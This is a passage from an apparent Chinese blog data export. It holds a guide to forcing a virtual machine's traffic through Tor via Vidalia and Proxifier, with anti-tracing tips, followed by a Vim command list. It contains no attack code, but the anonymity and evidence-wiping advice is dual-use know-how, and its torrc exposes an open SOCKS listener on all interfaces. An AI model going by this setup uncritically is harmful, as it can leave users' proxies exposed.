Servers，点击Add...\n![](/content/images/2016/07/7-pic_hd.jpg)\n\n随后保存并设置而为默认\n\n**6.测试网络**\n\n打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。\n![](/content/images/2016/07/9-pic_hd.jpg)\n![](/content/images/2016/07/8-pic_hd.jpg)\n\n### **总结**\n\n为了保证用户隐私的绝对安全，建议做到以下几点：\n\n* 在虚拟机系统下不要留下任何痕迹：\n * 虚拟机操作系统系统语言设置为英语，地区为美国。\n * 虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。\n * 关机前清除系统隐私记录，养成良好习惯。\n * 能设置不保留记录的软件均设置如此。\n * 不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。\n * 不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。\n* 将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。\n* 设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。\n* 进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。\n\n**特别鸣谢**\n\n感谢几年前@safe121提供的无私技术帮助\n\n","slug":"tor","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xoi001l5es5e2cvd5zh","content":"<p>本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。<br><a id=\"more\"></a><br>声明！</p>\n<p>==本文原创，技术无罪，笔者即将身处海外，本文撰写目的<strong>仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途</strong>。==</p>\n<p>==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，<strong>不允许任何形式私自转载</strong>，本文只进行对TOR相关<strong>技术探讨</strong>，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==</p>\n<p><strong>准备条件</strong></p>\n<ul>\n<li><p>1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。</p>\n</li>\n<li><p>2.最新版Vidalia <a href=\"https://dist.torproject.org/vidalia-bundles/\" target=\"_blank\" rel=\"external\">下载地址</a>（需完整互联网）</p>\n</li>\n<li><p>3.Vmware Fusion/Vmware workstation/Oracle VirtualBox</p>\n</li>\n<li><p>4.一个完整版的虚拟机操作系统</p>\n</li>\n</ul>\n<p><strong>笔者环境</strong></p>\n<p>操作系统：OS X EI Capitan 10.11.5</p>\n<p>虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)</p>\n<p>虚拟机操作系统：Windows xp sp2 或 Kali linux</p>\n<p>隧道软件：lantern 或 shadowsockets</p>\n<h3 id=\"Vidalia部分\"><a href=\"#Vidalia部分\" class=\"headerlink\" title=\"Vidalia部分\"></a>Vidalia部分</h3><p><em>如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。</em><br><img src=\"/content/images/2016/07/1-1.png\" width=\"500px\"><br><strong>1.建立您的隧道网络</strong></p>\n<p>笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。</p>\n<p><strong>2.在Vidalia中设置代理连接</strong></p>\n<p>打开Vidalia-设置-网络：我使用代理服务器连接网络</p>\n<p>地址：127.0.0.1 端口：1080（用户定义）</p>\n<p>类型：SOCKS 5<br><img src=\"/content/images/2016/07/1-2.png\" alt=\"\"></p>\n<p><strong>3.继续设置，转发出外网端口</strong></p>\n<p>Vidalia-设置-高级-编辑当前torrc：<br><img src=\"/content/images/2016/07/1-3.png\" alt=\"\"><br>确认socksport为9050，也可以定义为其他端口。<br>同时添加<code>SocksListenAddress 0.0.0.0:9050</code>到底部<br>保存</p>\n<p>笔者配置文件如下，仅供参考，不可复制：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># This file was generated by Tor; if you edit it, comments will not be preserved</span></div><div class=\"line\"><span class=\"comment\"># The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore it</span></div><div class=\"line\"></div><div class=\"line\">ControlPort 9051</div><div class=\"line\">DataDirectory /Users/ivan/.tor</div><div class=\"line\">DirReqStatistics 0</div><div class=\"line\">HashedControlPassword 16:此处隐藏</div><div class=\"line\">Socks5Proxy 127.0.0.1:1080</div><div class=\"line\">Log notice stdout</div><div class=\"line\">SocksListenAddress 0.0.0.0:9050</div><div class=\"line\">SocksPort 9050</div></pre></td></tr></table></figure>\n<p><br><img src=\"/content/images/2016/07/1-4.png\" alt=\"\"><br><strong>4.Vidalia启动TOR</strong></p>\n<p>稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。<br><img src=\"/content/images/2016/07/1-5.png\" alt=\"\"><br>随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。<br><img src=\"/content/images/2016/07/2-2.png\" alt=\"\"><br><img src=\"/content/images/2016/07/2-1.png\" alt=\"\"></p>\n<h3 id=\"Vmware部分\"><a href=\"#Vmware部分\" class=\"headerlink\" title=\"Vmware部分\"></a>Vmware部分</h3><p><strong>1.设置Vmware，添加虚拟网卡</strong></p>\n<p>进入Vmware的偏好设置-网络，先点小锁，把功能解锁。</p>\n<p>然后点+，新建一个网络，<strong>警告：请勿勾选NAT</strong>。</p>\n<p><strong>勾选 将MAC主机连入该网络</strong></p>\n<p>同时设置 <strong>通过DHCP在该网络提供网络地址</strong>：</p>\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n<p><img src=\"/content/images/2016/07/1.jpg\" alt=\"\"><br><strong>2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2</strong></p>\n<p>虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。<br><img src=\"/content/images/2016/07/2.jpg\" alt=\"\"></p>\n<h3 id=\"虚拟机部分-Win\"><a href=\"#虚拟机部分-Win\" class=\"headerlink\" title=\"虚拟机部分(Win)\"></a><strong>虚拟机部分(Win)</strong></h3><p><strong>1.进入操作系统</strong></p>\n<p>建议重新安装操作系统，以保证系统纯净性。<br><img src=\"/content/images/2016/07/4-1.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/5-pic_hd.jpg\" alt=\"\"></p>\n<p><strong>2.寻找宿主机ip</strong></p>\n<p>经过笔者的简单测试，宿主机ip为172.16.225.1<br><img src=\"/content/images/2016/07/6-pic_hd.jpg\" alt=\"\"><br>如果实在找不到，可用啊D工具箱或nmap等工具进行查找。</p>\n<p><strong>3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接</strong></p>\n<p><strong>4.安装Proxifier</strong></p>\n<p>Proxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。</p>\n<p><strong>5.配置Proxifer</strong></p>\n<p>打开Proxifier-Profile-Proxy Servers，点击Add…<br><img src=\"/content/images/2016/07/7-pic_hd.jpg\" alt=\"\"></p>\n<p>随后保存并设置而为默认</p>\n<p><strong>6.测试网络</strong></p>\n<p>打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。<br><img src=\"/content/images/2016/07/9-pic_hd.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/8-pic_hd.jpg\" alt=\"\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><strong>总结</strong></h3><p>为了保证用户隐私的绝对安全，建议做到以下几点：</p>\n<ul>\n<li>在虚拟机系统下不要留下任何痕迹：<ul>\n<li>虚拟机操作系统系统语言设置为英语，地区为美国。</li>\n<li>虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。</li>\n<li>关机前清除系统隐私记录，养成良好习惯。</li>\n<li>能设置不保留记录的软件均设置如此。</li>\n<li>不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。</li>\n<li>不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。</li>\n</ul>\n</li>\n<li>将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。</li>\n<li>设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。</li>\n<li>进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。</li>\n</ul>\n<p><strong>特别鸣谢</strong></p>\n<p>感谢几年前@safe121提供的无私技术帮助</p>\n","excerpt":"<p>本文主要介绍了如何将一个虚拟机系统全局使用TOR技术，笔者所用操作系统为OS X EI Capitan 10.11.5，虚拟机系统为VMware Fusion专业版 8.1.1 (3771013)。<br>","more":"<br>声明！</p>\n<p>==本文原创，技术无罪，笔者即将身处海外，本文撰写目的<strong>仅为防止美国棱镜计划侵犯本人隐私安全，无其它任何用途</strong>。==</p>\n<p>==使用TOR技术请在遵守当地法律的前提下使用！本软件在中国大陆地区已被封锁，按照相关法律法规，禁止使用本软件。由于相关政策法律原因，<strong>不允许任何形式私自转载</strong>，本文只进行对TOR相关<strong>技术探讨</strong>，不涉及任何违法违规行为，请勿用于非法用途（如渗透服务器、非法扫描网段、不受监控的网络言论、不受监控的非法互联网通讯等），如出现上述等违法行为，请自负法律责任！==</p>\n<p><strong>准备条件</strong></p>\n<ul>\n<li><p>1.一个隧道(ssh,shadowsocks,socket5,http,vpn都可以)可以连接到真正的互联网，如果身处海外请无视此条。</p>\n</li>\n<li><p>2.最新版Vidalia <a href=\"https://dist.torproject.org/vidalia-bundles/\">下载地址</a>（需完整互联网）</p>\n</li>\n<li><p>3.Vmware Fusion/Vmware workstation/Oracle VirtualBox</p>\n</li>\n<li><p>4.一个完整版的虚拟机操作系统</p>\n</li>\n</ul>\n<p><strong>笔者环境</strong></p>\n<p>操作系统：OS X EI Capitan 10.11.5</p>\n<p>虚拟机软件：VMware Fusion专业版 8.1.1 (3771013)</p>\n<p>虚拟机操作系统：Windows xp sp2 或 Kali linux</p>\n<p>隧道软件：lantern 或 shadowsockets</p>\n<h3 id=\"Vidalia部分\"><a href=\"#Vidalia部分\" class=\"headerlink\" title=\"Vidalia部分\"></a>Vidalia部分</h3><p><em>如果你的网络未进行封锁，请忽略前2步，请跑步进入第3步。</em><br><img src=\"/content/images/2016/07/1-1.png\" width = \"500px\"/><br><strong>1.建立您的隧道网络</strong></p>\n<p>笔者以shadowsocks为例，开启shadowsocks配置好信息后，无需做任何操作。shadowsocks的默认对外端口为1080。</p>\n<p><strong>2.在Vidalia中设置代理连接</strong></p>\n<p>打开Vidalia-设置-网络：我使用代理服务器连接网络</p>\n<p>地址：127.0.0.1 端口：1080（用户定义）</p>\n<p>类型：SOCKS 5<br><img src=\"/content/images/2016/07/1-2.png\" alt=\"\"></p>\n<p><strong>3.继续设置，转发出外网端口</strong></p>\n<p>Vidalia-设置-高级-编辑当前torrc：<br><img src=\"/content/images/2016/07/1-3.png\" alt=\"\"><br>确认socksport为9050，也可以定义为其他端口。<br>同时添加<code>SocksListenAddress 0.0.0.0:9050</code>到底部<br>保存</p>\n<p>笔者配置文件如下，仅供参考，不可复制：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"comment\"># This file was generated by Tor; if you edit it, comments will not be preserved</span></div><div class=\"line\"><span class=\"comment\"># The old torrc file was renamed to torrc.orig.1 or similar, and Tor will ignore it</span></div><div class=\"line\"></div><div class=\"line\">ControlPort 9051</div><div class=\"line\">DataDirectory /Users/ivan/.tor</div><div class=\"line\">DirReqStatistics 0</div><div class=\"line\">HashedControlPassword 16:此处隐藏</div><div class=\"line\">Socks5Proxy 127.0.0.1:1080</div><div class=\"line\">Log notice stdout</div><div class=\"line\">SocksListenAddress 0.0.0.0:9050</div><div class=\"line\">SocksPort 9050</div></pre></td></tr></table></figure>\n<p></pre><br><img src=\"/content/images/2016/07/1-4.png\" alt=\"\"><br><strong>4.Vidalia启动TOR</strong></p>\n<p>稍等片刻，需要建立Tor回路，五分钟后，便会提示你连接成功。<br><img src=\"/content/images/2016/07/1-5.png\" alt=\"\"><br>随后可以通过使用Chrome的网络代理插件测试，通过ip测试可判断是否成功。如果ip地址每几分钟自动更新一次，且都是不同国家的，则说明TOR回路建立成功。<br><img src=\"/content/images/2016/07/2-2.png\" alt=\"\"><br><img src=\"/content/images/2016/07/2-1.png\" alt=\"\"></p>\n<h3 id=\"Vmware部分\"><a href=\"#Vmware部分\" class=\"headerlink\" title=\"Vmware部分\"></a>Vmware部分</h3><p><strong>1.设置Vmware，添加虚拟网卡</strong></p>\n<p>进入Vmware的偏好设置-网络，先点小锁，把功能解锁。</p>\n<p>然后点+，新建一个网络，<strong>警告：请勿勾选NAT</strong>。</p>\n<p><strong>勾选 将MAC主机连入该网络</strong></p>\n<p>同时设置 <strong>通过DHCP在该网络提供网络地址</strong>：</p>\n<pre>\n子网ip：172.16.225.0\n\n子网掩码：255.255.255.0\n</pre>\n\n<p><img src=\"/content/images/2016/07/1.jpg\" alt=\"\"><br><strong>2.在虚拟机系统的配置中，将网络适配器的上网方式改为vmnet2</strong></p>\n<p>虚拟机-设置-网络适配器-vmnet2，请再次确保无其他上网方式以保证绝对安全。<br><img src=\"/content/images/2016/07/2.jpg\" alt=\"\"></p>\n<h3 id=\"虚拟机部分-Win\"><a href=\"#虚拟机部分-Win\" class=\"headerlink\" title=\"虚拟机部分(Win)\"></a><strong>虚拟机部分(Win)</strong></h3><p><strong>1.进入操作系统</strong></p>\n<p>建议重新安装操作系统，以保证系统纯净性。<br><img src=\"/content/images/2016/07/4-1.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/5-pic_hd.jpg\" alt=\"\"></p>\n<p><strong>2.寻找宿主机ip</strong></p>\n<p>经过笔者的简单测试，宿主机ip为172.16.225.1<br><img src=\"/content/images/2016/07/6-pic_hd.jpg\" alt=\"\"><br>如果实在找不到，可用啊D工具箱或nmap等工具进行查找。</p>\n<p><strong>3.确认系统当前状态下不能上网，甚至局域网也不可通，检查网络连接中的网络适配器，禁用一切，仅保留本地连接</strong></p>\n<p><strong>4.安装Proxifier</strong></p>\n<p>Proxifier是一个全局代理软件，将socket端口流量转发到系统全局，十分好用稳定，值得推荐。</p>\n<p><strong>5.配置Proxifer</strong></p>\n<p>打开Proxifier-Profile-Proxy Servers，点击Add…<br><img src=\"/content/images/2016/07/7-pic_hd.jpg\" alt=\"\"></p>\n<p>随后保存并设置而为默认</p>\n<p><strong>6.测试网络</strong></p>\n<p>打开浏览器，对当前ip进行查询，ip会随着时间随机切换，不同国家。<br><img src=\"/content/images/2016/07/9-pic_hd.jpg\" alt=\"\"><br><img src=\"/content/images/2016/07/8-pic_hd.jpg\" alt=\"\"></p>\n<h3 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a><strong>总结</strong></h3><p>为了保证用户隐私的绝对安全，建议做到以下几点：</p>\n<ul>\n<li>在虚拟机系统下不要留下任何痕迹：<ul>\n<li>虚拟机操作系统系统语言设置为英语，地区为美国。</li>\n<li>虚拟机下的浏览器建议使用friefox或chrome，安装https everywhere、noscript等插件，在浏览器相关设置中设置禁止追踪等查看隐私行为。</li>\n<li>关机前清除系统隐私记录，养成良好习惯。</li>\n<li>能设置不保留记录的软件均设置如此。</li>\n<li>不要安装使用任何国产软件，尤其是任何国产音乐播放器、任何国产视频播放器，严禁使用360等任何管家、QQ、搜狗输入法、各种国产云盘，否则一定会前功尽弃。</li>\n<li>不要使用任何私人账户登录任何网站、任何软件，如有必要，建议现场注册新号码，不要自作聪明使用尘封已久的小号。</li>\n</ul>\n</li>\n<li>将虚拟机操作系统放在Truecrypt等加密软件的虚拟磁盘里，如果是Windows，建议开启Bitlocker，如果是MacOS，建议开启FileVault，同时将系统密码设置为与自己隐私无关的高强度密码。</li>\n<li>设置宿主机的BIOS密码，防止设备被盗隐私丢失，同时建议写好一键远程删除虚拟磁盘的sh脚本，以防重要文件泄露。</li>\n<li>进入TOR网络后，您将面临更大的网络威胁，因为TOR的网域中深藏全球各地的极客、大黑客、恐怖分子等危险人物，请更加注意保护虚拟机子系统安全以及文件安全。</li>\n</ul>\n<p><strong>特别鸣谢</strong></p>\n<p>感谢几年前@safe121提供的无私技术帮助</p>"},{"title":"Vim 命令大全","id":"3","updated":"2016-08-05T20:14:15.000Z","date":"2016-07-28T09:16:13.000Z","_content":"<!-- more --> \n## \n**进入vi的命令**\n\nvi filename :打开或新建文件，并将光标置于第一行首\n\nvi +n filename ：打开文件，并将光标置于第n行首\n\nvi + filename ：打开文件，并将光标置于最后一行首\n\nvi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处\n\nvi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename\n\nvi filename....filename ：打开多个文件，依次进行编辑\n\n## 移动光标类命令\n\nh ：光标左移一个字符\n\nl ：光标右移一个字符\n\nspace：光标右移一个字符\n\nBackspace：光标左移一个字符\n\nk或Ctrl+p：光标上移一行\n\nj或Ctrl+n ：光标下移一行\n\nEnter ：光标下移一行\n\nw或W ：光标右移一个字至字首\n\nb或B ：光标左移一个字至字首\n\ne或E ：光标右移一个字至字尾\n\n) ：光标移至句尾\n\n( ：光标移至句首\n\n}：光标移至段落开头\n\n{：光标移至段落结尾\n\nnG：光标移至第n行首\n\nn+：光标下移n行\n\nn-：光标上移n行\n\nn$：光标移至第n行尾\n\nH ：光标移至屏幕顶行\n\nM ：光标移至屏幕中间行\n\nL ：光标移至屏幕最后行\n\n0：（注意是数字零）光标移至当前行首\n\n$：光标移至当前行尾\n\n## 屏幕翻滚类命令\n\nCtrl+u：向文件首翻半屏\n\nCtrl+d：向文件尾翻半屏\n\nCtrl+f：向文件尾翻一屏\n\nCtrl＋b；向文件首翻一屏\n\nnz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。\n\n## 插入文本类命令\n\ni ：在光标前\n\nI ：在当前行首\n\na：光标后\n\nA：在当前行尾\n\no：在当前行之下新开一行\n\nO：在当前行之上新开一行\n\nr：替换当前字符\n\nR：替换当前字符及其后的字符，直至按ESC键\n\ns：从当前光标位置处开始，以输入的文本替代指定数目的字符\n\nS：删除指定数目的行，并以所输入文本代替之\n\nncw或nCW：修改指定数目的字\n\nnCC：修改指定数目的行\n\n## 删除命令\n\nndw或ndW：删除光标处开始及其后的n-1个字\n\ndo：删至行首\n\nd$：删至行尾\n\nndd：删除当前行及其后n-1行\n\nx或X：删除一个字符，x删除光标后的，而X删除光标前的\n\nCtrl+u：删除输入方式下所输入的文本\n\n## 搜索及替换命令\n\n/pattern：从光标开始处向文件尾搜索pattern\n\n?pattern：从光标开始处向文件首搜索pattern\n\nn：在同一方向重复上一次搜索命令\n\nN：在反方向上重复上一次搜索命令\n\n：s/p1/p2/g：将当前行中所有p1均用p2替代\n\n：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代\n\n：g/p1/s//p2/g：将文件中所有p1均用p2替换\n\n## 选项设置\n\nall：列出所有选项设置情况\n\nterm：设置终端类型\n\nignorance：在搜索中忽略大小写\n\nlist：显示制表位(Ctrl+I)和行尾标志（$)\n\nnumber：显示行号\n\nreport：显示由面向行的命令修改过的数目\n\nterse：显示简短的警告信息\n\nwarn：在转到别的文件时若没保存当前文件则显示NO write信息\n\nnomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符\n\nnowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始\n\nmesg：允许vi显示其他用户用write写到自己终端上的信息\n\n## 最后行方式命令\n\n：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下\n\n：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下\n\n：n1,n2 d ：将n1行到n2行之间的内容删除\n\n：w ：保存当前文件\n\n：e filename：打开文件filename进行编辑\n\n：x：保存当前文件并退出\n\n：q：退出vi\n\n：q!：不保存文件并退出vi\n\n：!command：执行shell命令command\n\n：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入\n\n：r!command：将命令command的输出结果放到当前行\n\n## 寄存器操作\n\n\"?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字\n\nndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。","source":"_posts/Vim-命令大全.md","raw":"---\ntitle: Vim 命令大全\ntags: 'Linux'\npermalink: vimda-quan\nid: 3\nupdated: '2016-08-05 21:14:15'\ndate: 2016-07-28 10:16:13\n---\n<!-- more --> \n## \n**进入vi的命令**\n\nvi filename :打开或新建文件，并将光标置于第一行首\n\nvi +n filename ：打开文件，并将光标置于第n行首\n\nvi + filename ：打开文件，并将光标置于最后一行首\n\nvi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处\n\nvi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename\n\nvi filename....filename ：打开多个文件，依次进行编辑\n\n## 移动光标类命令\n\nh ：光标左移一个字符\n\nl ：光标右移一个字符\n\nspace：光标右移一个字符\n\nBackspace：光标左移一个字符\n\nk或Ctrl+p：光标上移一行\n\nj或Ctrl+n ：光标下移一行\n\nEnter ：光标下移一行\n\nw或W ：光标右移一个字至字首\n\nb或B ：光标左移一个字至字首\n\ne或E ：光标右移一个字至字尾\n\n) ：光标移至句尾\n\n( ：光标移至句首\n\n}：光标移至段落开头\n\n{：光标移至段落结尾\n\nnG：光标移至第n行首\n\nn+：光标下移n行\n\nn-：光标上移n行\n\nn$：光标移至第n行尾\n\nH ：光标移至屏幕顶行\n\nM ：光标移至屏幕中间行\n\nL ：光标移至屏幕最后行\n\n0：（注意是数字零）光标移至当前行首\n\n$：光标移至当前行尾\n\n## 屏幕翻滚类命令\n\nCtrl+u：向文件首翻半屏\n\nCtrl+d：向文件尾翻半屏\n\nCtrl+f：向文件尾翻一屏\n\nCtrl＋b；向文件首翻一屏\n\nnz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。\n\n## 插入文本类命令\n\ni ：在光标前\n\nI ：在当前行首\n\na：光标后\n\nA：在当前行尾\n\no：在当前行之下新开一行\n\nO：在当前行之上新开一行\n\nr：替换当前字符\n\nR：替换当前字符及其后的字符，直至按ESC键\n\ns：从当前光标位置处开始，以输入的文本替代指定数目的字符\n\nS：删除指定数目的行，并以所输入文本代替之\n\nncw或nCW：修改指定数目的字\n\nnCC：修改指定数目的行\n\n## 删除命令\n\nndw或ndW：删除光标处开始及其后的n-1个字\n\ndo：删至行首\n\nd$：删至行尾\n\nndd：删除当前行及其后n-1行\n\nx或X：删除一个字符，x删除光标后的，而X删除光标前的\n\nCtrl+u：删除输入方式下所输入的文本\n\n## 搜索及替换命令\n\n/pattern：从光标开始处向文件尾搜索pattern\n\n?pattern：从光标开始处向文件首搜索pattern\n\nn：在同一方向重复上一次搜索命令\n\nN：在反方向上重复上一次搜索命令\n\n：s/p1/p2/g：将当前行中所有p1均用p2替代\n\n：n1,n2s/p1/p2/g：将第n1至n2行中所有p1均用p2替代\n\n：g/p1/s//p2/g：将文件中所有p1均用p2替换\n\n## 选项设置\n\nall：列出所有选项设置情况\n\nterm：设置终端类型\n\nignorance：在搜索中忽略大小写\n\nlist：显示制表位(Ctrl+I)和行尾标志（$)\n\nnumber：显示行号\n\nreport：显示由面向行的命令修改过的数目\n\nterse：显示简短的警告信息\n\nwarn：在转到别的文件时若没保存当前文件则显示NO write信息\n\nnomagic：允许在搜索模式中，使用前面不带“\\”的特殊字符\n\nnowrapscan：禁止vi在搜索到达文件两端时，又从另一端开始\n\nmesg：允许vi显示其他用户用write写到自己终端上的信息\n\n## 最后行方式命令\n\n：n1,n2 co n3：将n1行到n2行之间的内容拷贝到第n3行下\n\n：n1,n2 m n3：将n1行到n2行之间的内容移至到第n3行下\n\n：n1,n2 d ：将n1行到n2行之间的内容删除\n\n：w ：保存当前文件\n\n：e filename：打开文件filename进行编辑\n\n：x：保存当前文件并退出\n\n：q：退出vi\n\n：q!：不保存文件并退出vi\n\n：!command：执行shell命令command\n\n：n1,n2 w!command：将文件中n1行至n2行的内容作为command的输入并执行之，若不指定n1，n2，则表示将整个文件内容作为command的输入\n\n：r!command：将命令command的输出结果放到当前行\n\n## 寄存器操作\n\n\"?nyy：将当前行及其下n行的内容保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyw：将当前行及其下n个字保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?nyl：将当前行及其下n个字符保存到寄存器？中，其中?为一个字母，n为一个数字\n\n\"?p：取出寄存器？中的内容并将其放到光标位置处。这里？可以是一个字母，也可以是一个数字\n\nndd：将当前行及其下共n行文本删除，并将所删内容放到1号删除寄存器中。","slug":"vimda-quan","published":1,"comments":1,"layout":"post","photos":[],"link":"","_id":"cj2mm9xok001o5es56slslmkw","content":"<a id=\"more\"></a> \n<p>##<br><strong>进入vi的命令</strong></p>\n<p>vi filename :打开或新建文件，并将光标置于第一行首</p>\n<p>vi +n filename ：打开文件，并将光标置于第n行首</p>\n<p>vi + filename ：打开文件，并将光标置于最后一行首</p>\n<p>vi +/pattern filename：打开文件，并将光标置于第一个与pattern匹配的串处</p>\n<p>vi -r filename ：在上次正用vi编辑时发生系统崩溃，恢复filename</p>\n<p>vi filename….filename ：打开多个文件，依次进行编辑</p>\n<h2 id=\"移动光标类命令\"><a href=\"#移动光标类命令\" class=\"headerlink\" title=\"移动光标类命令\"></a>移动光标类命令</h2><p>h ：光标左移一个字符</p>\n<p>l ：光标右移一个字符</p>\n<p>space：光标右移一个字符</p>\n<p>Backspace：光标左移一个字符</p>\n<p>k或Ctrl+p：光标上移一行</p>\n<p>j或Ctrl+n ：光标下移一行</p>\n<p>Enter ：光标下移一行</p>\n<p>w或W ：光标右移一个字至字首</p>\n<p>b或B ：光标左移一个字至字首</p>\n<p>e或E ：光标右移一个字至字尾</p>\n<p>) ：光标移至句尾</p>\n<p>( ：光标移至句首</p>\n<p>}：光标移至段落开头</p>\n<p>{：光标移至段落结尾</p>\n<p>nG：光标移至第n行首</p>\n<p>n+：光标下移n行</p>\n<p>n-：光标上移n行</p>\n<p>n$：光标移至第n行尾</p>\n<p>H ：光标移至屏幕顶行</p>\n<p>M ：光标移至屏幕中间行</p>\n<p>L ：光标移至屏幕最后行</p>\n<p>0：（注意是数字零）光标移至当前行首</p>\n<p>$：光标移至当前行尾</p>\n<h2 id=\"屏幕翻滚类命令\"><a href=\"#屏幕翻滚类命令\" class=\"headerlink\" title=\"屏幕翻滚类命令\"></a>屏幕翻滚类命令</h2><p>Ctrl+u：向文件首翻半屏</p>\n<p>Ctrl+d：向文件尾翻半屏</p>\n<p>Ctrl+f：向文件尾翻一屏</p>\n<p>Ctrl＋b；向文件首翻一屏</p>\n<p>nz：将第n行滚至屏幕顶部，不指定n时将当前行滚至屏幕顶部。</p>\n<h2 id=\"插入文本类命令\"><a href=\"#插入文本类命令\" class=\"headerlink\" title=\"插入文本类命令\"></a>插入文本类命令</h2><p>i ：在光标前</p>\n<p>I ：在当前行首</p>\n<p>a：光标后</p>\n<p>A：在当前行尾</p>\n<p>o：在当前行之下新开一行</p>\n<p>O：在当前行之上新开一行</p>\n<p>r：替换当前字符</p>\n<p>R：替换当前字符及其后的字符，直至按ESC键</p>\n<p>s：从当前光标位置处开始，以输入的文本替代指定数目的字符</p>\n<p>S：删除指定数目的行，并以所输入文本代替之</p>\n<p>ncw或nCW：修改指定数目的字</p>\n<p>nCC：修改指定数目的行</p>\n<h2 id=\"删除命令\"><a href=\"#删除命令\" class=\"headerlink\" 